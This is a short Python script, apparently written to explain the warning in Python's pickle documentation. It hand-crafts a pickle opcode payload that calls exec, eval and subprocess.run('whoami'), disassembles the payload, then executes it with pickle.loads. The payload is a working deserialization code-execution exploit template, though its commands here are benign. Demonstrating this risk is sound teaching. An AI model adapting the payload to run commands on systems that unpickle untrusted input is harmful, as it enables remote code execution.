# How to run arbitrary code using pickle.loads if you're wondering why there's
# a warning on the pickle documentation
# Based on blog post: https://intoli.com/blog/dangerous-pickles/
import pickle
import pickletools


# Not mentioned in the blog post but '0' pops the top value off the stack
# https://github.com/python/cpython/blob/3.10/Lib/pickletools.py
opcode = b"""c__builtin__
exec
(Vimport subprocess
tR0c__builtin__
eval
(Vprint("Hello world!")
tR0csubprocess
run
(Vwhoami
tR."""

print("DISASSEMBLE OPCODE")
pickletools.dis(opcode)
print("\n")

print("RUN OPCODE")
pickle.loads(opcode)
